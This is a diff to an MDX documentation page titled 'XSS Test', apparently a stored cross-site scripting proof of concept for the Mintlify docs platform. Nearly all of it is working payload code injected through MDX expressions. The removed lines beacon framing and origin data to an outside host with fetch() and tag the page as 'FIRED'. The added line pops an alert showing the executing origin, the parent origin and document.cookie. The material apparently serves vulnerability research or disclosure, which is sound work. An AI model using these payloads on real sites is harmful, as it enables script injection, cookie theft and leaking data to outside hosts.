@@ -1,9 +1,10 @@
 ---
 title: "XSS Test"
-description: "editor-preview context probe"
+description: "stored xss poc"
 ---
 
 XSSPROBESTART
-{globalThis.fetch?.('https://reacher-44c3453d.mintlify.app/__xssbeacon?framed='+(globalThis.top!==globalThis.self)+'&anc='+encodeURIComponent((globalThis.location&&globalThis.location.ancestorOrigins&&globalThis.location.ancestorOrigins[0])||globalThis.document?.referrer||'none'))}
-{globalThis.document?.documentElement?.setAttribute?.('data-xss-proof','FIRED-'+globalThis.location?.host)}
+
+{globalThis.alert?.('Mintlify stored XSS via MDX expression\n\nExecuting on origin: '+globalThis.location?.host+'\nFramed by (parent origin): '+((globalThis.location&&globalThis.location.ancestorOrigins&&globalThis.location.ancestorOrigins[0])||globalThis.document?.referrer||'(top window)')+'\n\ndocument.cookie = '+globalThis.document?.cookie)}
+
 XSSPROBEEND
